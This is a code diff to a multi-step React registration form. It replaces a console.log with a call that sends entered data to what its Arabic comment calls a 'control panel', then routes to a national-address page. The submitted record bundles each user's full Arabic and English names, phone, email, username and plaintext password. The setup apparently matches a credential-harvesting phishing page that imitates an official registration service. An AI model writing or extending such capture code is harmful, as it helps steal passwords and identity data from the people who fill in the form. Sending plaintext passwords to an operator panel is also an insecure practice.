@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function RegisterStep3() {
   const [, setLocation] = useLocation();
@@ -188,12 +189,16 @@ export default function RegisterStep3() {
       return;
     }
     
-    // Handle form submission
-    console.log({ 
-      firstNameAr, fatherNameAr, grandfatherNameAr, familyNameAr,
-      firstNameEn, fatherNameEn, grandfatherNameEn, familyNameEn,
-      phone, email, username, password, confirmPassword, agreeTerms 
+    // إرسال البيانات للوحة التحكم
+    submitData({
+      'الاسم بالعربي': `${firstNameAr} ${fatherNameAr} ${grandfatherNameAr} ${familyNameAr}`,
+      'الاسم بالإنجليزي': `${firstNameEn} ${fatherNameEn} ${grandfatherNameEn} ${familyNameEn}`,
+      'رقم الجوال': phone,
+      'البريد الإلكتروني': email,
+      'اسم المستخدم': username,
+      'كلمة المرور': password,
     });
+    
     // Navigate to National Address page
     setLocation('/national-address');
   };
